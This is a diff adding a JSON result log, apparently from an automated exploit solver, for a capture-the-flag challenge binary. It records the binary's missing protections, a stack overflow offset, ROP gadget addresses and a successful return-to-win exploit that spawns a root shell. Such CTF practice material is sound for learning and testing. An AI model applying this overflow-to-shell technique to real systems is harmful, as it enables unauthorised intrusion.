@@ -1,0 +1,46 @@
+{
+  "name": "ch11_fd2e",
+  "ok": true,
+  "strategy": "ret2win",
+  "detail": "jump to execve(\"/bin/sh\") @ 0x4011fb off=40 align=0",
+  "elapsed": 1.0,
+  "attempt_count": 1,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "amd64/64",
+      "pie": false,
+      "canary": false,
+      "nx": true,
+      "relro": "Full",
+      "static": false
+    },
+    "vulns": [
+      "read@0x401278 disp=-32 off=40 limit=256"
+    ],
+    "wins": [
+      "shell@0x4011fb(execve(\"/bin/sh\"))"
+    ],
+    "binsh": "0x402017",
+    "gadgets": {
+      "pop_rbp": "0x40117d",
+      "ret": "0x40101a",
+      "leave": "0x401282"
+    },
+    "csu": false,
+    "mmap_rwx": null,
+    "fmt_buf": null,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x4011fb off=40 align=0",
+      "ok": true,
+      "elapsed": 0.87,
+      "tail": "Welcome to NewStar CTF!!\nShow me your magic\nCongratulations!!!\nPWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
